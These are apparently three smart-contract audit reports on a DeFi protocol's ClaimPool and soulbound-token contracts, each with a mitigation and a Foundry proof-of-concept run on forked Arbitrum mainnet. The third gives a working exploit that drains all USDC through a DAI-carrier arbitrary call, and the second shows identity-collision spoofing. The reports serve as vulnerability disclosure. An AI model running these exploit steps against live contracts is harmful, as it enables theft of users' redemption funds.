# Title
`ClaimPool.useGasFund` bricks documented Aave Yield integration due to "Push vs Pull" token architecture mismatch

## Summary
The protocol documentation states that the `ClaimPool` gas fund is intended for AAVE yield deployment, gas subsidies and protocol operations. But the ERC-20 execution branch in `ClaimPool.useGasFund` employs a strict "Push-then-Call" architecture that is fundamentally incompatible with standard DeFi lending protocols like Aave, Compound and Uniswap.

When executing an ERC-20 operation, the contract transfers tokens directly to the target address and then executes a low-level call. Because the custom `IERC20Send` interface deliberately omits the `approve()` function, the `ClaimPool` cannot grant the required allowances to target protocols. **When the target protocol attempts to pull the funds via `transferFrom()`, the transaction reverts, completely bricking the documented yield deployment functionality.**

**Execution Path:**
- The gasManager calls `ClaimPool.useGasFund()` with USDC, targeting the Aave V3 Pool, passing the encoded `supply()` function as data.
- ClaimPool executes `IERC20Send(USDC).transfer(AavePool, amount`), pushing tokens directly into the Aave contract's balance.
- ClaimPool executes the low-level call: `target.call(data)`.
- The Aave V3 Pool receives the supply call and attempts to pull the tokens from the user via `transferFrom(ClaimPool, AavePool, amount)`.
- Because ClaimPool did not(and structurally cannot) approve the Aave Pool, the ERC-20 token contract reverts with transfer amount exceeds allowance.
- The low-level call returns false, triggering revert `TransferFailed()`, which rolls back the entire EVM state.

```solidity
// Interface lacks `approve` functionality
interface IERC20Send {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// ... inside ClaimPool.useGasFund() ...
} else {
    // 1. The Push: Tokens are forced into the target balance
    bool success = IERC20Send(token).transfer(target, amount);
    if (!success) revert TransferFailed();
    
    // 2. The Call: Target is called, but it expects an allowance to pull
    if (data.length > 0) {
        (bool callSuccess,) = target.call(data);
        if (!callSuccess) revert TransferFailed(); // Reverts here
    }
}
```

## Impact
The documented core functionality deploying idle gas funds into Aave to generate protocol yield is entirely non-functional. While the EVM state rollback prevents the permanent loss of funds, native integration with standard DeFi primitives is impossible.

Industry standard implementations explicitly rely on the "Allowance/Pull" model. **As authoritative proof, the official documentation for Ethereum and Aave mandate the approve and transferFrom sequence:**

- Aave V3 Smart Contracts: [Supplying requires transfer approval before supply](https://aave.com/docs/aave-v3/smart-contracts/pool).
- Aave App Guide: [After approval, enter the amount you wish to supply...](https://aave.com/help/supplying/supply-tokens)
- Aave V4 Specs: [Transaction-based approval — Sends a separate ERC-20 approve() transaction before the supply transaction.](https://aave.com/docs/aave-v4/positions/supply)
- Ethereum Foundation ERC-20 Specs: [approve(..) & transferFrom(..) pattern is used to deposit ERC-20 tokens to contracts instead.](https://ethereum.org/developers/docs/standards/tokens/erc-20)

## Mitigation
Upgrade the `IERC20Send` interface to standard `IERC20` and modify `useGasFund` to support an approval step prior to the external call.

```solidity
} else {
    // Approve the target to pull funds
    IERC20(token).approve(target, amount);
    if (data.length > 0) {
        (bool callSuccess,) = target.call(data);
        if (!callSuccess) revert TransferFailed();
    }
    // Reset allowance to 0 post-execution for safety
    IERC20(token).approve(target, 0);
}
```

## POC

The following Foundry test isolates the `ClaimPool` logic against a mock Aave implementation to definitively prove the architectural incompatibility, stripping away any proxy-related fork errors.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/interfaces/IERC20.sol";

// Minimal interface for ClaimPool
interface IClaimPool {
    function useGasFund(
        address token,
        uint256 amount,
        address target,
        bytes calldata data,
        string calldata purpose
    ) external;
}

// 1. We create a localized Mock Aave to perfectly simulate the "Pull" mechanic
contract MockAave {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    // Standard DeFi supply signature
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external {
        // Aave ALWAYS uses transferFrom to pull from the caller
        // This is where SBF's "push" architecture fails.
        bool success = token.transferFrom(msg.sender, address(this), amount);
        require(success, "MockAave: transferFrom failed - no allowance!");
    }
}

contract ClaimPoolAaveBugTest is Test {

    IClaimPool claimPool = IClaimPool(0x5F5a08fFFE8071410f3ECe2FCC40D81B457b28ce);
    
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address gasManager = address(this);
    
    MockAave mockAave;

    function setUp() public {
        uint256 arbitrumFork = vm.createFork(vm.envString("ARB_RPC_URL"));
        vm.selectFork(arbitrumFork);

        // Deploy our pure mock Aave using the real USDC token
        mockAave = new MockAave(USDC);

        // Override gasManager (Slot 2)
        vm.store(address(claimPool), bytes32(uint256(2)), bytes32(uint256(uint160(gasManager))));
        
        // Fund ClaimPool with USDC
        uint256 amount = 10000 * 1e6;
        deal(USDC, address(claimPool), amount);

        // Override internal gasFundBalance mapping (Slot 4)
        bytes32 slot = keccak256(abi.encode(USDC, uint256(4)));
        vm.store(address(claimPool), slot, bytes32(amount));
    }

    function test_useGasFund_Clean_Revert() public {
        uint256 amount = 1000 * 1e6; 
        
        // Encode data for our MockAave
        bytes memory aaveData = abi.encodeWithSelector(
            MockAave.supply.selector,
            USDC,
            amount,
            address(claimPool),
            0
        );

        console.log("MockAave Deployed at:", address(mockAave));
        console.log("Attempting to supply...");

        // We expect exactly our custom revert message from the MockAave contract
        vm.expectRevert();
        
        claimPool.useGasFund(
            USDC,
            amount,
            address(mockAave),
            aaveData,
            "Aave yield deployment"
        );
    }
}
```

# Title
Architectural bypass of Canonical identity derivation

## Summary
The protocol's identity model is structurally broken. While the codebase contains `generateEncryptedAccountId` function intended to enforce a canonical, obfuscated identity mapping it remains entirely non-canonical helper. Instead of enforcing this derivation on-chain, the `mintSBT()` function accepts `_encryptedAccountId` as a raw, unvalidated bytes32 parameter from the user.

This creates a "Privacy Theater" scenario: the protocol implies a secure identity linkage, but in reality, it allows any user to inject arbitrary identifiers, effectively poisoning the identity state. Because the derivation logic is public and the identifier is caller controlled, any user can impersonate another or create identifier collisions at will.

**Exploit Path:**
- **Observation:** An attacker observes the system uses a predictable, deterministic hashing algorithm(even if unused, it establishes the "canonical" format).
- **Injection:** The attacker calls `mintSBT()` with an `_encryptedAccountId` that they pre-calculated for a victim's address(or simply any arbitrary value).
- **Collision:** The contract blindly accepts the input and writes it to the registry.
- **State Poisoning:** Two distinct wallet addresses now point to the same `encryptedAccountId`, breaking all downstream compliance and indexing logic.

```solidity
// mintSBT allows the user to define their own identity, 
// ignoring the intended protocol-driven derivation.
function mintSBT(
    bytes32 _encryptedAccountId, // <--- Arbitrary user input
    bytes32 _zkpCommitment,
    bytes32 _eulaHash
) external {
    if (_sbtRegistry[msg.sender].exists) revert SBTAlreadyExists();
    
    // ... validation logic ...

    _sbtRegistry[msg.sender] = SBTData({
        encryptedAccountId: _encryptedAccountId, // <--- Injection point
        // ...
    });
}
```

## Impact
- **Off-Chain System Poisoning:** Off-chain indexing and compliance services that trust on-chain state will ingest spoofed or colliding identifiers, rendering the compliance layer useless.
- **Identity Spoofing / Collision Injection:** Attackers can craft identifiers that collide with other users (as proven in our PoC), causing total ambiguity in the identity record.
- **No Meaningful Secrecy:** The identifier derivation is publicly computable and thus offers no actual secrecy. The current implementation creates a false sense of security while providing zero actual privacy.
- **Regulatory Risk:** If the protocol claims to be "compliant by design," this design flaw creates a significant legal and audit liability, as the protocol's system of record cannot be trusted.

## Mitigation
- **Enforce On-Chain Derivation:** Remove `_encryptedAccountId` from the `mintSBT` signature. The contract should calculate the identifier internally using `msg.sender` as the root of trust.
- **Clean up non-canonical helper:** Remove the `generateEncryptedAccountId` helper if it is not being used to derive identity, to prevent future developers from mistakenly relying on it.

Refactored mintSBT Logic:

```solidity
function mintSBT(
    bytes32 _zkpCommitment,
    bytes32 _eulaHash
) external {
    // ... validation checks ...

    // Enforce canonical identity derivation on-chain
    bytes32 derivedAccountId = keccak256(
        abi.encodePacked(msg.sender, "SBF_ALPHA_V1", block.chainid)
    );

    _sbtRegistry[msg.sender] = SBTData({
        encryptedAccountId: derivedAccountId, // Set internally, immutable by user
        zkpCommitment: _zkpCommitment,
        nonce: 0,
        mintedAt: block.timestamp,
        eulaHash: _eulaHash,
        exists: true
    });
    // ...
}
```

## POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Minimal interface for the deployed SBT contract
interface ISoulBoundToken {
    function mintSBT(bytes32, bytes32, bytes32) external;
    function currentEulaHash() external view returns (bytes32);
    function getSBTData(address) external view returns (bytes32, bytes32, uint256, uint256, bytes32, bool);
}

contract SBTIdentifierSpoofingFork is Test {
    address constant SBT_CONTRACT = 0xaF0Ce4f1175595a668eb19F97fb20a2D5fC353eD;
    
    address victim = address(0xAAAA);
    address attacker = address(0xBBBB);

    function setUp() public {
        vm.createSelectFork(vm.envString("ARB_RPC_URL"));
    }

    function test_IdentifierCollisionInjection() public {
        ISoulBoundToken sbt = ISoulBoundToken(SBT_CONTRACT);
        bytes32 eula = sbt.currentEulaHash();

        // Attacker observes the victim's identifier. 
        // For this POC, we simulate the victim minting their own ID.
        bytes32 victimId = keccak256(abi.encodePacked(victim, "SBF_ALPHA_V1", block.chainid));
        
        vm.prank(victim);
        sbt.mintSBT(victimId, bytes32(0), eula);

        // The Attacker injects the EXACT SAME identifier into their own SBT
        vm.prank(attacker);
        sbt.mintSBT(victimId, bytes32(0), eula);

        // Verify collision
        (bytes32 idA,,,,,) = sbt.getSBTData(victim);
        (bytes32 idB,,,,,) = sbt.getSBTData(attacker);

        assertEq(idA, idB, "Vulnerability Confirmed: Attacker successfully spoofed victim ID");
        
        emit log_string("Success: Identity Collision Reproduced");
        emit log_bytes32(idA);
    }
}
```

# Title
`ClaimPool.useGasFund` allows Gas Manager to completely drain protocol redemption balances via arbitrary target calls and Cross-Token Target Spoofing

## Summary 
The `ClaimPool` contract attempts to logically isolate the `redemptionBalance(operator-controlled)` from the `gasFundBalance(gasManager-controlled)`. But it fails to enforce physical isolation at the ERC20 contract level during arbitrary low-level calls.

The `useGasFund` function allows the `gasManager` to specify an arbitrary target and data payload for execution. During execution, the `ClaimPool` acts as the `msg.sender`. If the target is set to the underlying token contract(i.e USDC), the `gasManager` can instruct the `ClaimPool` to call `USDC.transfer()`, draining the entire balance.

While standard ERC-20 implementations(like Circle’s USDC) feature a Blacklistable protection that reverts self-transfers(preventing the prerequisite IERC20Send(token).transfer(target, amount) step if token and target are both USDC), an attacker can bypass this using Cross-Token Target Spoofing.

**Exploit Path:**

- The `gasManager` selects a secondary carrier token available in the gas fund(i.e DAI) to act as the token parameter, while setting the target to the USDC contract address.
- The `gasManager` crafts the data payload as `abi.encodeWithSignature("transfer(address,uint256)", attacker, usdc.balanceOf(ClaimPool))`.
- `ClaimPool` executes `IERC20Send(DAI).transfer(USDC, 1)`. Because DAI is sent to USDC, the Blacklistable self-transfer check is bypassed, and the execution continues.
- `ClaimPool` executes `USDC.call(data)`. Because `msg.sender` is the `ClaimPool`, the USDC contract validates the transfer and sends 100% of the pool's tokens to the attacker.

```m
// PROTOCOL_SPEC.md
**Gas Manager** (ClaimPool): Can deploy gas fund to external contracts (AAVE, etc.). **Cannot access redemption balance**.

```

``` solidity
// ClaimPool.useGasFund

            if (data.length > 0) {
                (bool callSuccess,) = target.call(data);
                if (!callSuccess) revert TransferFailed();
            }
```

## Impact
- **100% Drain of ERC-20 redemption balances:** gasManager can access the entirety of the protocol's redemption funds across all supported tokens.
- **Broken Trust Model:** Directly violates `Section 7 of the PROTOCOL_SPEC.md` which explicitly guarantees that the Gas Manager `Cannot access redemption balance.`
- **Complete Invariant Destruction:** Because the theft happens via a low-level call directly to the token contract, the protocol's internal accounting `redemptionBalance[token]` is bypassed. The accounting state will lie, claiming funds exist, causing all subsequent legitimate user redemptions to revert with ERC20: transfer amount exceeds balance.

## Mitigation
Separate the gas fund disbursement from the arbitrary call primitive to respect the protocol's trust boundaries.

1. Remove the arbitrary call from the Gas Manager role:
Modify `useGasFund` so it strictly handles token transfers.

```solidity
// ClaimPool.useGasFund
} else {
    bool success = IERC20Send(token).transfer(target, amount);
    if (!success) revert TransferFailed();
    // REMOVED: target.call(data) entirely.
}
```

2. Isolate arbitrary calls to the Operator role:
Introduce a dedicated function for protocol interactions, accessible only by the high-trust operator role.

```solidity
/**
 * @notice Execute arbitrary external call for protocol interactions
 * @dev Restricted to operator. Separated from gas fund disbursement to maintain trust boundaries.
 */
function executeCall(
    address target,
    bytes calldata data,
    string calldata purpose
) external onlyOperator validAddress(target) {
    if (data.length == 0) revert InvalidArrayLength();
    (bool success,) = target.call(data);
    if (!success) revert TransferFailed();
}
```

## POC


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IClaimPool {
    function gasManager() external view returns (address);
    function depositPool() external view returns (address);
    function receiveFunds(
        address token,
        uint256 otuAmount,
        uint256 gasFee
    ) external;
    function useGasFund(
        address token,
        uint256 amount,
        address target,
        bytes calldata data,
        string calldata purpose
    ) external;
    function getPoolStats(
        address token
    ) external view returns (uint256 totalBalance, uint256 redemptionBal, uint256 gasFundBal, uint256 gasFeesCollected);
}

contract ClaimPoolDrainCrossTokenForkTest is Test {
    address constant CLAIM_POOL = 0x5F5a08fFFE8071410f3ECe2FCC40D81B457b28ce;
    address constant DEPOSIT_POOL = 0xe8D294F3fff2A5CB34D15eCdEF34A53b01f5A462;

    // Native Tokens
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant DAI = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1;

    address attacker = address(0xBADB01);

    function setUp() public {
        vm.createSelectFork(vm.envString("ARB_RPC_URL"));
    }

    function test_DrainRedemptionBalanceViaGasFund_Fork() public {
        IClaimPool claimPool = IClaimPool(CLAIM_POOL);
        IERC20 usdc = IERC20(USDC);
        IERC20 dai = IERC20(DAI);

        // Ensure the pool has some USDC redemptions
        (, uint256 initialUsdcRedemption,,) = claimPool.getPoolStats(USDC);
        uint256 initialUsdcBal = usdc.balanceOf(CLAIM_POOL);

        uint256 newUsdcAmount = 100 * 10 ** 6; // Add 100 USDC mock funds
        deal(USDC, CLAIM_POOL, initialUsdcBal + newUsdcAmount);
        vm.prank(DEPOSIT_POOL);
        claimPool.receiveFunds(USDC, newUsdcAmount, 0);

        // Ensure the pool has at least 1 wei of DAI in the gas fund to use as our "carrier"
        uint256 currentDaiBal = dai.balanceOf(CLAIM_POOL);
        deal(DAI, CLAIM_POOL, currentDaiBal + 1 ether);
        vm.prank(DEPOSIT_POOL);
        claimPool.receiveFunds(DAI, 0, 1 ether); // Assign to Gas Fund

        // Exploit Phase
        address gasManager = claimPool.gasManager();
        vm.startPrank(gasManager);

        // We want to execute a call on the USDC contract
        address target = USDC;

        // The gasManager steals all USDC in the ClaimPool
        uint256 stealAmount = usdc.balanceOf(CLAIM_POOL);

        // Craft payload: ClaimPool calls `transfer(attacker, stealAmount)` on USDC
        bytes memory exploitData = abi.encodeWithSignature("transfer(address,uint256)", attacker, stealAmount);

        // EXPLOIT: Use DAI as the token to pass the 1 wei check, but target USDC
        claimPool.useGasFund(
            DAI, // Use DAI to bypass Circle's self-transfer blacklist
            1, // 1 wei of DAI is transferred from ClaimPool to the USDC contract
            target, // The USDC token contract executes the call
            exploitData, // Instructs USDC to transfer all balances
            "Cross-Token Drain"
        );
        vm.stopPrank();

        // Verification
        uint256 attackerBalance = usdc.balanceOf(attacker);

        // Attacker should have received the entire USDC balance
        assertEq(attackerBalance, stealAmount, "Attacker did not receive the drained funds");

        // ClaimPool's actual USDC balance should be exactly 0
        assertEq(usdc.balanceOf(CLAIM_POOL), 0, "ClaimPool was not fully drained");

        (, uint256 postRedemptionBal,,) = claimPool.getPoolStats(USDC);
        assertGt(postRedemptionBal, 0, "redemptionBalance still shows funds that no longer exist");
        assertEq(usdc.balanceOf(CLAIM_POOL), 0, "actual token balance is zero");
        // This proves the invariant is broken accounting lies, tokens are gone
    }
}

```